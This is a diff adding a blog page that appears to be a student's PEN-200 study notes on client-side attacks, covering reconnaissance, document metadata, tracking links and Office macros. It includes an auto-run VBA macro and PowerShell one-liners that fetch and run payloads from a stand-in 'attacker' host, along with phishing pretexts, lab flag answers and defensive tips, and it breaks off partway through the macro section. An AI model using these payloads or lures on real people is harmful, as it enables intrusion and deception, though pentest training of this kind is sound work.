@@ -1,0 +1,1017 @@
+
+    <article class="git-panel git-file-panel" data-git-panel-section="blob">
+      <header class="git-file-header">
+        <h4 class="git-file-title">client-side-attacks.html</h4>
+        <div class="git-file-meta">
+          <span>43 KB</span>
+          <span>site-output/blog/client-side-attacks.html</span>
+        </div>
+      </header>
+      <div class="git-file-body">
+        <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+  &lt;title&gt;Core – PEN-200 Module 11 — Client-Side Tradecraft&lt;/title&gt;
+
+  
+    &lt;!-- head partial (auto-generated) --&gt;
+
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0, viewport-fit=cover&quot;/&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.googleapis.com&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; crossorigin&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Audiowide&amp;family=Orbitron:wght@400..900&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Rubik+Iso&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../assets/static/style/cm.css&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.googleapis.com&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; crossorigin&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Syne+Mono&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;../assets/static/js/cm.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;https://unpkg.com/htmx.org@1.9.12&quot; defer&gt;&lt;/script&gt;
+&lt;link rel=&quot;manifest&quot; href=&quot;../site.webmanifest&quot;/&gt;
+&lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;../assets/static/img/favicon.ico&quot;&gt;
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+&lt;/head&gt;
+&lt;body class=&quot;cm-body blog-page&quot;&gt;
+  &lt;header&gt;
+    &lt;div class=&quot;container header-container&quot;&gt;
+      
+      
+      
+        &lt;a href=&quot;../index.html&quot; class=&quot;logo-link&quot;&gt;
+          &lt;img src=&quot;../assets/static/img/not-dead.webp&quot; alt=&quot;Core Logo&quot; class=&quot;logo&quot;&gt;
+        &lt;/a&gt;
+      
+      
+      
+        &lt;button type=&quot;button&quot; class=&quot;nav-toggle&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+          &lt;svg width=&quot;24&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot;&gt;
+            &lt;path d=&quot;M3 7h18M3 12h18M3 17h18&quot; /&gt;
+          &lt;/svg&gt;
+        &lt;/button&gt;
+        &lt;nav class=&quot;main-nav&quot;&gt;
+          &lt;ul class=&quot;nav-links&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;../index.html&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;../blog.html&quot;&gt;Blog&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        &lt;/nav&gt;
+      
+    &lt;/div&gt;
+  &lt;/header&gt;
+
+  &lt;main class=&quot;blog-container blog-post-view&quot;&gt;
+    &lt;div class=&quot;blog-article-shell&quot;&gt;
+      &lt;a class=&quot;blog-back-link&quot; href=&quot;../blog.html&quot;&gt;
+        &lt;svg viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; aria-hidden=&quot;true&quot;&gt;
+          &lt;path d=&quot;M15 18l-6-6 6-6&quot; /&gt;
+        &lt;/svg&gt;
+        Back to Chaos &amp;amp; Majesty Journal
+      &lt;/a&gt;
+      
+
+&lt;article class=&quot;blog-article-body&quot; data-slug=&quot;client-side-attacks&quot;&gt;
+  &lt;header class=&quot;blog-article-header&quot;&gt;
+    &lt;h1 class=&quot;blog-article-title&quot;&gt;PEN-200 Module 11 — Client-Side Tradecraft&lt;/h1&gt;
+    &lt;p class=&quot;blog-article-meta&quot;&gt;
+      
+        &lt;span&gt;Sep 6, 2023&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;28 min read&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;m4xx3d0ut&lt;/span&gt;
+      
+    &lt;/p&gt;
+  &lt;/header&gt;
+
+  
+
+  &lt;div class=&quot;blog-article-content&quot;&gt;
+    &lt;h2&gt;TLDR;&lt;/h2&gt;
+&lt;p&gt;Client-side compromises hinge on believable pretext, payload quality, and disciplined logging. The lab notes captured repeatable recipes—this update folds them in.&lt;/p&gt;
+&lt;h3&gt;Recon That Drives Pretext&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Mine LinkedIn, GitHub, and company press releases for tooling references (Office macros, Adobe forms, Teams).&lt;/li&gt;
+&lt;li&gt;Capture target operating systems with web beacon lures or email auto-responses; record user-agent strings.&lt;/li&gt;
+&lt;li&gt;Build a spreadsheet of candidate targets, their job roles, and the lure theme that fits (e.g., “Quarterly security update”).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Macro Payload Workflow&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Draft the lure document (existing corporate template, logos, styles).&lt;/li&gt;
+&lt;li&gt;Embed the macro in &lt;code&gt;ThisDocument&lt;/code&gt; or &lt;code&gt;AutoOpen&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Stage payloads using PowerShell-to-base64 encoding.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;payload=$(echo -n &amp;quot;IEX(New-Object Net.WebClient).DownloadString(&amp;#39;https://attacker/payload.ps1&amp;#39;)&amp;quot; | iconv -t UTF-16LE | base64 -w 0)
+cat &amp;lt;&amp;lt;&amp;#39;VBA&amp;#39; &amp;gt; macro.vba
+Sub AutoOpen()
+    Dim cmd As String
+    cmd = &amp;quot;powershell -nop -w hidden -enc &amp;quot; &amp;amp; &amp;quot;&amp;quot;&amp;quot;$payload&amp;quot;&amp;quot;&amp;quot;
+    CreateObject(&amp;quot;Wscript.Shell&amp;quot;).Run cmd
+End Sub
+VBA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&quot;4&quot;&gt;
+&lt;li&gt;Sign the macro if the client provides a code-signing cert; log hash, timestamp, and signer.&lt;/li&gt;
+&lt;li&gt;Validate in a sandbox (Hyper-V/VMware snapshot) before delivery.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Windows Library &amp;amp; Shortcut Abuses&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Craft &lt;code&gt;.library-ms&lt;/code&gt; pointing to an attacker-controlled share; host payload DLLs via SMB/WebDAV.&lt;/li&gt;
+&lt;li&gt;Build &lt;code&gt;.lnk&lt;/code&gt; shortcuts launching PowerShell or &lt;code&gt;regsvr32 /s /n /u /i:https://... scrobj.dll&lt;/code&gt; commands.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;mklink payload.lnk &amp;quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&amp;quot;
+powershell.exe -Command &amp;quot;$client = New-Object Net.WebClient; $client.DownloadFile(&amp;#39;https://attacker/payload.exe&amp;#39;,&amp;#39;%TEMP%\upd.exe&amp;#39;); Start-Process &amp;#39;%TEMP%\upd.exe&amp;#39;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Document which Windows warning prompts appear during testing; include mitigations (MOTW enforcement, macro policy) in the report.&lt;/p&gt;
+&lt;h3&gt;Delivery &amp;amp; Tracking&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Send emails via &lt;code&gt;swaks&lt;/code&gt; with SPF/DKIM-aligned headers if the client authorises domain spoofing.&lt;/li&gt;
+&lt;li&gt;Track opens and payload callbacks with unique IDs per recipient (append &lt;code&gt;?id=alice&lt;/code&gt; to URLs, embed beacon images).&lt;/li&gt;
+&lt;li&gt;Record timezone, send time, and follow-up results in the engagement timeline.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Defensive Counterpoints&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Recommend enabling &lt;code&gt;Block macros from the Internet&lt;/code&gt;, deploying AMSI-aware scanners, and enforcing application control.&lt;/li&gt;
+&lt;li&gt;Provide detection pointers: Event IDs (3008 macro execution, 4104 PowerShell script block), Sysmon configs catching LOLBAS abuse.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Client-side operations reward preparation. Blend into genuine workflows, keep payload telemetry, and deliver actionable blue-team guidance alongside the exploit narrative.&lt;/p&gt;
+&lt;h2&gt;Working Notes... In Graphic Detail...&lt;/h2&gt;
+&lt;h4&gt;Client Side Attacks&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Target Reconnaissance.&lt;/li&gt;
+&lt;li&gt;Exploiting Microsoft Office.&lt;/li&gt;
+&lt;li&gt;Abusing Windows Library Files.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;11.1 Target Reconnaissance&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;Gather information to prepare client-side attacks.&lt;/li&gt;
+&lt;li&gt;Leverage client fingerprinting to obtain information.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Information Gathering&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;Methods of enumerating targets installed software without interacting directly.&lt;ul&gt;
+&lt;li&gt;Suited for cases where we have no way to interact.&lt;/li&gt;
+&lt;li&gt;We wil not alert monitoring systems or leave forensic traces.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Metadata of publicly available docs&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://exiftool.org/TagNames/&quot;&gt;Metadata&lt;/a&gt; can be sanitized, but is often not.&lt;/li&gt;
+&lt;li&gt;Tags categorized by &lt;a href=&quot;https://exiftool.org/#Tag%20Groups&quot;&gt;tag groups&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;Can include;&lt;ul&gt;
+&lt;li&gt;Author.&lt;/li&gt;
+&lt;li&gt;Creation date.&lt;/li&gt;
+&lt;li&gt;Name and version of software used to create the doc.&lt;/li&gt;
+&lt;li&gt;OS of client.&lt;/li&gt;
+&lt;li&gt;Etc.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Data is sometimes;&lt;ul&gt;
+&lt;li&gt;Explicitly stored in metadata.&lt;/li&gt;
+&lt;li&gt;Infered from the doc iteself.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Keep in mind.&lt;ul&gt;
+&lt;li&gt;This information can be stale.&lt;/li&gt;
+&lt;li&gt;Diff branches of the same org may use diff software.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;This approach is &amp;quot;hands-off&amp;quot;.&lt;ul&gt;
+&lt;li&gt;We may not gather accurate info.&lt;/li&gt;
+&lt;li&gt;Still a viable and effective approach.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Techniques&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Leverage inforamtion gathering methods.&lt;ul&gt;
+&lt;li&gt;Google dorking.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;site:example.com filetype:pdf&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Finds PDFs on target webpage.&lt;/li&gt;
+&lt;li&gt;Adding keywords to narrow results.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Website enumeration tools.&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;gobuster&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; param to search for specific file extensions on target site.&lt;/li&gt;
+&lt;li&gt;However this is noisy and will generate log entries.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Can also manually browse taget site.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/client-side]
+└─$ exiftool -a -u brochure.pdf 
+ExifTool Version Number         : 12.65
+File Name                       : brochure.pdf
+Directory                       : .
+File Size                       : 311 kB
+File Modification Date/Time     : 2023:09:07 07:50:49-07:00
+File Access Date/Time           : 2023:09:07 07:50:49-07:00
+File Inode Change Date/Time     : 2023:09:07 07:50:52-07:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.7
+Linearized                      : No
+Page Count                      : 4
+Language                        : de-DE
+Tagged PDF                      : Yes
+XMP Toolkit                     : Image::ExifTool 12.41
+Creator                         : Stanley Yelnats
+Title                           : Mountain Vegetables
+Author                          : Stanley Yelnats
+Producer                        : Microsoft® PowerPoint® for Microsoft 365
+Create Date                     : 2022:04:27 07:34:01+02:00
+Creator Tool                    : Microsoft® PowerPoint® for Microsoft 365
+Modify Date                     : 2022:04:27 07:34:01+02:00
+Document ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
+Instance ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
+Title                           : Mountain Vegetables
+Author                          : Stanley Yelnats
+Create Date                     : 2022:04:27 07:34:01+02:00
+Modify Date                     : 2022:04:27 07:34:01+02:00
+Producer                        : Microsoft® PowerPoint® for Microsoft 365
+Creator                         : Stanley Yelnats
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Important info;&lt;ul&gt;
+&lt;li&gt;Creation date.&lt;/li&gt;
+&lt;li&gt;Last modified date.&lt;ul&gt;
+&lt;li&gt;Date sections reveal relative age of doc.&lt;/li&gt;
+&lt;li&gt;Recent dates indicate information is likely current.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Author&amp;#39;s name.&lt;ul&gt;
+&lt;li&gt;Employee name can be used to establish a trust reltionship.&lt;ul&gt;
+&lt;li&gt;Drop their name casualy in target email or phone call.&lt;/li&gt;
+&lt;li&gt;Especially helpful if author maintains a small public profile.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Operating system.&lt;/li&gt;
+&lt;li&gt;Application used to create the doc.&lt;ul&gt;
+&lt;li&gt;Reveals PDF was created with &amp;quot;Microsoft Powerpoint for Microsoft 365&amp;quot;.&lt;ul&gt;
+&lt;li&gt;Crucial for planning since there is no mention of Mac or macOS in tags.&lt;/li&gt;
+&lt;li&gt;Probable that Windows was used.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;With this info we can now leverage client-side attack vectors from Windows System Components to maliscious Office Docs.&lt;/p&gt;
+&lt;h6&gt;Information Gathering Exercises&lt;/h6&gt;
+&lt;p&gt;Download old.pdf from the Mountain Vegetables website on VM #1 by clicking on the OLD button. Use exiftool to review the file&amp;#39;s metadata. Enter the value of the Author tag.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;OS{f678c053253b0510a2c0b218bf47709c}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Start VM #2 and use gobuster to bruteforce the contents of the web server. Specify &amp;quot;pdf&amp;quot; as the filetype and find a document other than old.pdf and brochure.pdf. After you identify the file, download it and extract the flag in the metadata.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec]
+└─$ exiftool -a -u info.pdf             
+ExifTool Version Number         : 12.65
+File Name                       : info.pdf
+Directory                       : .
+File Size                       : 310 kB
+File Modification Date/Time     : 2023:09:07 08:02:24-07:00
+File Access Date/Time           : 2023:09:07 08:08:43-07:00
+File Inode Change Date/Time     : 2023:09:07 08:08:43-07:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.7
+Linearized                      : No
+Page Count                      : 4
+Language                        : de-DE
+Tagged PDF                      : Yes
+XMP Toolkit                     : Image::ExifTool 11.88
+Description                     : OS{e0a979b57fd890dfa555f1846e3e3a64}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;Client Fingerprinting&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;Client Fingerprinting to obtain OS and browser info from target in non-routable internal network.&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Device_fingerprint&quot;&gt;Device Fingerprinting&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Example;&lt;ul&gt;
+&lt;li&gt;We may be tasked to establish a foothold on a target network for a pentest.&lt;/li&gt;
+&lt;li&gt;Assume we previously extracted a target email.&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/laramies/theHarvester&quot;&gt;theHarvester&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We could use &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/ms536496%28VS.85%29.aspx&quot; title=&quot;https://msdn.microsoft.com/en-us/library/ms536496(VS.85).aspx&quot;&gt;HTML Application (HTA)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Before we attack, we have to confirm out target is;&lt;ul&gt;
+&lt;li&gt;Running Windows.&lt;/li&gt;
+&lt;li&gt;Has IE or MS Edge enabled.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;For this purpose we can use &lt;a href=&quot;https://canarytokens.com/&quot;&gt;Canarytokens&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;Generates link with embeded token that we send to target.&lt;/li&gt;
+&lt;li&gt;When target opens, we get;&lt;ul&gt;
+&lt;li&gt;Info about their browser.&lt;/li&gt;
+&lt;li&gt;IP address.&lt;/li&gt;
+&lt;li&gt;OS.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;With this info we can confirm the target is running Win and verify if we should attempt HTA client-side attack.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Before we create a tracking link, understand the &lt;a href=&quot;https://www.imperva.com/learn/application-security/pretexting/&quot;&gt;pretexts&lt;/a&gt;. We can&amp;#39;t just ask a target to click a link in an arbitrary email, so we must create a context, perhaps by leveraging the target&amp;#39;s job role.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Assume the target is working in a finance department.&lt;/li&gt;
+&lt;li&gt;We could say we recieved an invoice, but it contains a financial error.&lt;/li&gt;
+&lt;li&gt;Offer a link that we say opens a screenshot with the error highlighted.&lt;ul&gt;
+&lt;li&gt;This is the canarytoken link.&lt;/li&gt;
+&lt;li&gt;When the target clicks the link we get our info and they get a blank page.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;With our pretext defined, visit the &lt;a href=&quot;https://canarytokens.org/generate&quot;&gt;Canarytoken generation page&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;Web form provides dropdown to select type of tracking token to gen.&lt;/li&gt;
+&lt;li&gt;Enter email address or webhook URL for alerts.&lt;/li&gt;
+&lt;li&gt;To test;&lt;ul&gt;
+&lt;li&gt;Select &lt;code&gt;Web bug/ URL&lt;/code&gt; token.&lt;/li&gt;
+&lt;li&gt;Enter &lt;a href=&quot;https://example.com&quot;&gt;https://example.com&lt;/a&gt; as webhook URL.&lt;/li&gt;
+&lt;li&gt;Enter Fingerprinting as comment.&lt;/li&gt;
+&lt;li&gt;Click &amp;quot;Create my Canarytoke&amp;quot;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;http://canarytokens.com/tags/static/8jcpijj1da6phaduilhs51607/index.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Confirmation page contains tracking link.&lt;/li&gt;
+&lt;li&gt;Also provides ideas on how to get target to click link.&lt;/li&gt;
+&lt;li&gt;Next, click &amp;quot;Manage this token&amp;quot;.&lt;ul&gt;
+&lt;li&gt;Shows options for token.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&amp;quot;History&amp;quot; shows all visitors that clicked our token link.&lt;ul&gt;
+&lt;li&gt;Once triggered we can retrieve information about the target systems.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The JS fingerprinting code more accurately IDs the OS and browser.&lt;ul&gt;
+&lt;li&gt;User-agent can be spoofed and not always accurate.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Canarytoken provides other fingerprinting techniques as well.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Embed in Word Doc or PDF.&lt;/li&gt;
+&lt;li&gt;Embed into image &amp;lt;---- more convincing to target.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Alternate options;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://grabify.link/&quot;&gt;Grabify&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/fingerprintjs/fingerprintjs&quot;&gt;fingerprint.js&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6&gt;Client Fingerprinting Exercises&lt;/h6&gt;
+&lt;p&gt;Reproduce the steps from this section by opening the link yourself. Open the link one time with an enabled AdBlocker and one time with a disabled AdBlocker. Answer true or false: There is no difference in the results regarding enabled or disabled AdBlocker.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;False, although no difference was noted in Chrome Linux
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;11.2 Exploiting Microsoft Office&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand variations of Microsoft Office client-side attacks.&lt;/li&gt;
+&lt;li&gt;Install Microsoft Office.&lt;/li&gt;
+&lt;li&gt;Leverage Microsoft Word Macros.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Preparing the Attack&lt;/h5&gt;
+&lt;p&gt;Important considerations when using malicious Office Doc in a client-side attack.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Delivery method.&lt;ul&gt;
+&lt;li&gt;Macro attacks are well known, email provider spam filters often filter out all MS Office Docs.&lt;ul&gt;
+&lt;li&gt;In most cases we can&amp;#39;t just send it as an email attachment.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Most anti-phishing training programs stress the danger of enabling macros in an emailed Office Doc.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To deliver the Doc and increase the chance of target opening it, we have to use a convincing pretext and an alternate delivery method. A download link for example.&lt;/p&gt;
+&lt;p&gt;If succesfully delivered and opened, the doc will be tagged with the &lt;a href=&quot;https://attack.mitre.org/techniques/T1553/005/&quot;&gt;&amp;quot;Mark of the Web&amp;quot; (MOTW)&lt;/a&gt;. An Office doc tagged with MOTW will open in a &lt;a href=&quot;https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653&quot;&gt;protected view&lt;/a&gt; which disabled editing and blocks the execution of macros or embedded objects. When a target opens a MOTW Doc, they see a warning with the option to Enable Editing.&lt;/p&gt;
+&lt;p&gt;When the target enables editing, the protected view is disabled. The most direct way to bypass MOTW is to convince the target to click Enable Editing.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Example;&lt;ul&gt;
+&lt;li&gt;Blur the body of the doc and intruct the target to click the Enable Editing button to view it.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Not all Office docs have a protected view, Microsoft Publisher does not but is less frequently present on a system.&lt;/p&gt;
+&lt;p&gt;Microsoft also announced blocking macros by default. Affecting Access, Excel, PowerPoint, Visio, and Word in most Office versions from 2013-2021. Dates can be found in &lt;a href=&quot;https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked&quot;&gt;MS Learn page&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The Enable Content button is no longer available for Office docs delivered from the internet. A more tedious process of following a link outlining the dangers, following instructions, and checking a box in settings. This complicated the vector, but with thorough enumeration and considering the information here the chance of success increases greatly.&lt;/p&gt;
+&lt;p&gt;Despite the mitigation and heightened awareness, malicious Office Docs are still one of the most widely used client-side attack vectors. This highlights the dynamic between attacker and defender. For each security measure implemented the attacker is forced to develop a novel vectors and bypass methods. New defense mechanisms are just opportunities to develop more sophisticated attacks.&lt;/p&gt;
+&lt;h5&gt;Leveraging Microsoft Word Macros&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;Office apps like Word and Excel allow users to embed macros.&lt;ul&gt;
+&lt;li&gt;Macros execute a series of commands/instructions.&lt;/li&gt;
+&lt;li&gt;Orgs use macros to manage dynamic content and link docs to external content.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Macros can be written from scratch in &lt;a href=&quot;https://docs.microsoft.com/en-us/office/vba/api/overview/&quot;&gt;Visual Basic for Applications (VBA)&lt;/a&gt;, which is a powerful scripting language with full access to &lt;a href=&quot;https://en.wikipedia.org/wiki/ActiveX&quot;&gt;ActiveX objects&lt;/a&gt; and the Windows Script Host, similar to JavaScript in HTML Applications.&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Example; we will embed a macro in a Word doc to launch a reverse shell when the document is opened. Macros are one of the oldest and most well known attack vectors and still work well today, keeping in mind the mitigation described in the previous section.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;Bear in mind that older client-side attack vectors, including &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN&quot;&gt;Dynamic Data Exchange (DDE)&lt;/a&gt; and various &lt;a href=&quot;https://en.wikipedia.org/wiki/Object_Linking_and_Embedding&quot;&gt;Object Linking and Embedding (OLE)&lt;/a&gt; methods do not work well today without significant target system modification.&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;Create a blank Word doc &lt;code&gt;mymacro&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Save it as a &lt;code&gt;doc&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Newer &lt;code&gt;docx&lt;/code&gt; files require a template be attached.&lt;ul&gt;
+&lt;li&gt;They cannot be embeded, thus are not persistent.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Can also use &lt;code&gt;docm&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Click View tab.&lt;/li&gt;
+&lt;li&gt;Find and click the Macros button.&lt;/li&gt;
+&lt;li&gt;In the Macro menu.&lt;ul&gt;
+&lt;li&gt;Enter macro name &lt;code&gt;MyMacro&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Select from Macros in drop down &lt;code&gt;mymacro&lt;/code&gt; document.&lt;/li&gt;
+&lt;li&gt;Then click Create.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;This creates the Macro framework and opens a VB editor for us to develop our macro.&lt;/li&gt;
+&lt;li&gt;We can develop from scratch or use the provided skeleton.&lt;ul&gt;
+&lt;li&gt;The skeleton.&lt;ul&gt;
+&lt;li&gt;The main sub proceedure begins with the &lt;code&gt;Sub&lt;/code&gt; keyword.&lt;/li&gt;
+&lt;li&gt;It ends with &lt;code&gt;End Sub&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;This is the body of the Macro.&lt;/li&gt;
